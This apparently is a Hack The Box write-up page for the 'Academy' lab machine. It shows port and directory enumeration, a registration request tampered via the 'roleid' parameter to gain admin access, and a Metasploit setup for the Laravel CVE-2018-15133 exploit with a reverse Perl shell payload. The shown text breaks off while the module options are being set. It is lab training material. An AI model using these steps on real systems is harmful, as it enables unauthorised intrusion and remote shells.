@@ -1,0 +1,814 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HTB Writeup - Academy (Easy) :: CyberSpider</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup of Academy from Hack The Box." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/academy/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="CyberSpider" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB Writeup - Academy (Easy)">
+<meta property="og:description" content="Writeup of Academy from Hack The Box." />
+<meta property="og:url" content="/posts/academy/" />
+<meta property="og:site_name" content="CyberSpider" />
+
+  
+    <meta property="og:image" content="/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-07-18 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    cyberspider@ubuntu:~$
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/archive">archive</a></li>
+        
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/archive" >archive</a></li>
+        
+      
+        
+          <li><a href="/whoami" >whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/academy/">HTB Writeup - Academy (Easy)</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-07-18</time><span class="post-author">CyberSpider</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/htb/">htb</a>&nbsp;
+      
+      #<a href="/tags/easy/">easy</a>&nbsp;
+      
+      #<a href="/tags/linux/">linux</a>&nbsp;
+      
+      #<a href="/tags/cve-2018-15133/">CVE-2018-15133</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>The <code>Academy</code> machine is an easy linux box.</p>
+<p><img src="/images/Academy.png#center" alt="Scenario 1: Across columns"></p>
+<h2 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do a <code>nmap scan</code>:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ nmap -A -sC -sV 10.10.10.215
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 02:40 EDT
+Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 50.00% done; ETC: 02:40 (0:00:06 remaining)
+Nmap scan report for 10.10.10.215
+Host is up (0.11s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
+|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
+|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://academy.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.15 seconds
+</code></pre><p>I edit this file <code>/etc/hosts</code> in this way:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nano /etc/hosts                       
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat /etc/hosts
+</span></span><span style="display:flex;"><span>127.0.0.1       localhost
+</span></span><span style="display:flex;"><span>127.0.1.1       kali
+</span></span><span style="display:flex;"><span>::1             localhost ip6-localhost ip6-loopback
+</span></span><span style="display:flex;"><span>ff02::1         ip6-allnodes
+</span></span><span style="display:flex;"><span>ff02::2         ip6-allrouters
+</span></span><span style="display:flex;"><span>10.10.10.215    academy.htb
+</span></span></code></pre></div><h2 id="foothold">Foothold<a href="#foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="http">HTTP<a href="#http" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>In the Source Code I see this page of login:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;flex-center position-ref full-height&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;canvas&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;top-right links&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[http://academy.htb/login.php](http://academy.htb/login.php)&#34;</span>&gt;Login&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[http://academy.htb/register.php](http://academy.htb/register.php)&#34;</span>&gt;Register&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;content&#34;</span>&gt;
+</span></span></code></pre></div><h3 id="directory-enumeration">Directory Enumeration<a href="#directory-enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>I do a Dirtectory enumeration with <code>ffuf</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://academy.htb/FUZZ -e .php 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v2.0.0-dev
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://academy.htb/FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
+</span></span><span style="display:flex;"><span> :: Extensions       : .php 
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 1284ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    * FUZZ: .htpasswd.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 1470ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    * FUZZ: .htpasswd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 1612ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    * FUZZ: .htaccess.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 1613ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    * FUZZ: .htaccess
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 200, Size: 2633, Words: 668, Lines: 142, Duration: 119ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    * FUZZ: admin.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 113ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    * FUZZ: config.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 302, Size: 55034, Words: 4001, Lines: 1050, Duration: 119ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    * FUZZ: home.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 113ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    * FUZZ: images
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 200, Size: 2117, Words: 890, Lines: 77, Duration: 117ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    * FUZZ: index.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 200, Size: 2627, Words: 667, Lines: 142, Duration: 125ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    * FUZZ: login.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 200, Size: 3003, Words: 801, Lines: 149, Duration: 113ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    * FUZZ: register.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 116ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    * FUZZ: server-statuS
+</span></span></code></pre></div><p>I register in this page <code>/register.php</code>:</p>
+<ul>
+<li>Request:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /register.php <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">academy.htb</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">53</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">max-age=0</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://academy.htb</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://academy.htb/register.php</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.9</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=14gpqcgdsc2e9rtnpsvuouv0ba</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>uid=cyberspider&amp;password=cyber&amp;confirm=cyber&amp;roleid=0
+</span></span></code></pre></div><ul>
+<li>Response:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Tue, 18 Jul 2023 06:57:32 GMT</span>
+</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">Apache/2.4.41 (Ubuntu)</span>
+</span></span><span style="display:flex;"><span>Expires<span style="color:#f92672">:</span> <span style="color:#ae81ff">Thu, 19 Nov 1981 08:52:00 GMT</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">no-store, no-cache, must-revalidate</span>
+</span></span><span style="display:flex;"><span>Pragma<span style="color:#f92672">:</span> <span style="color:#ae81ff">no-cache</span>
+</span></span><span style="display:flex;"><span>Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Accept-Encoding</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">3003</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html; charset=UTF-8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>I have see in the request a interesting parameter <code>roleid</code> I change the value from <code>0</code> to <code>1</code>:</p>
+<ul>
+<li>Request:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /register.php <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">academy.htb</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">53</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">max-age=0</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://academy.htb</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://academy.htb/register.php</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.9</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=14gpqcgdsc2e9rtnpsvuouv0ba</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>uid=cyb3rspid3r&amp;password=cyber&amp;confirm=cyber&amp;roleid=1
+</span></span></code></pre></div><ul>
+<li>Response:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">302</span> <span style="color:#a6e22e">Found</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Tue, 18 Jul 2023 07:03:25 GMT</span>
+</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">Apache/2.4.41 (Ubuntu)</span>
+</span></span><span style="display:flex;"><span>Expires<span style="color:#f92672">:</span> <span style="color:#ae81ff">Thu, 19 Nov 1981 08:52:00 GMT</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">no-store, no-cache, must-revalidate</span>
+</span></span><span style="display:flex;"><span>Pragma<span style="color:#f92672">:</span> <span style="color:#ae81ff">no-cache</span>
+</span></span><span style="display:flex;"><span>location<span style="color:#f92672">:</span> <span style="color:#ae81ff">success-page.php</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">3003</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html; charset=UTF-8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>I login in this page <code>/admin.php</code>, and I discover two username:</p>
+<pre tabindex="0"><code>cry0l1t3
+mrb3n
+</code></pre><h3 id="cve-2018-15133">CVE-2018-15133<a href="#cve-2018-15133" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>I discover that there is a issue in this subdomain  <code>dev-staging-01.academy.htb</code>:</p>
+<p>I edit this file <code>/etc/hosts</code> in this way:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nano /etc/hosts                       
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat /etc/hosts
+</span></span><span style="display:flex;"><span>127.0.0.1       localhost
+</span></span><span style="display:flex;"><span>127.0.1.1       kali
+</span></span><span style="display:flex;"><span>::1             localhost ip6-localhost ip6-loopback
+</span></span><span style="display:flex;"><span>ff02::1         ip6-allnodes
+</span></span><span style="display:flex;"><span>ff02::2         ip6-allrouters
+</span></span><span style="display:flex;"><span>10.10.10.215    academy.htb
+</span></span><span style="display:flex;"><span>10.10.10.215    dev-staging-01.academy.htb
+</span></span></code></pre></div><p>I  see this subdomain <a href="http://dev-staging-01.academy.htb">http://dev-staging-01.academy.htb</a> and I discover that there is a PHP Framework <code>Laravel</code>. I discover a CVE  <code>CVE-2018-15133</code>, I exploit this CVE with Metasploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>msf6 &gt; search CVE-2018-15133
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#  Name                                              Disclosure Date  Rank       Check  Description</span>
+</span></span><span style="display:flex;"><span>   -  ----                                              ---------------  ----       -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Interact with a module by name or index. For example info 0, use <span style="color:#ae81ff">0</span> or use exploit/unix/http/laravel_token_unserialize_exec
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 &gt; use <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using configured payload cmd/unix/reverse_perl
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/http/laravel_token_unserialize_exec<span style="color:#f92672">)</span> &gt; show options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/unix/http/laravel_token_unserialize_exec<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name       Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----       ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   APP_KEY                     no        The base64 encoded APP_KEY string from the .env file
+</span></span><span style="display:flex;"><span>   Proxies                     no        A proxy chain of format type:host:port<span style="color:#f92672">[</span>,type:host:port<span style="color:#f92672">][</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   RHOSTS                      yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+</span></span><span style="display:flex;"><span>   RPORT      <span style="color:#ae81ff">80</span>               yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   SSL        false            no        Negotiate SSL/TLS <span style="color:#66d9ef">for</span> outgoing connections
+</span></span><span style="display:flex;"><span>   TARGETURI  /                yes       Path to target webapp
+</span></span><span style="display:flex;"><span>   VHOST                       no        HTTP server virtual host
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>cmd/unix/reverse_perl<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name   Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----   ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   LHOST                   yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exploit target:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Id  Name
+</span></span><span style="display:flex;"><span>   --  ----
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   Automatic
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>View the full module info with the info, or info -d command.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/http/laravel_token_unserialize_exec<span style="color:#f92672">)</span> &gt; set rhosts 10.10.10.215
+</span></span><span style="display:flex;"><span>rhosts <span style="color:#f92672">=</span>&gt; 10.10.10.215
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/http/laravel_token_unserialize_exec<span style="color:#f92672">)</span> &gt; set rport <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>rport <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/http/laravel_token_unserialize_exec<span style="color:#f92672">)</span> &gt; set lhost 10.10.14.104
+</span></span><span style="display:flex;"><span>lhost <span style="color:#f92672">=</span>&gt; 10.10.14.104
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/http/laravel_token_unserialize_exec<span style="color:#f92672">)</span> &gt; set vhost dev-staging-01.academy.htb
+</span></span><span style="display:flex;"><span>vhost <span style="color:#f92672">=</span>&gt; dev-staging-01.academy.htb
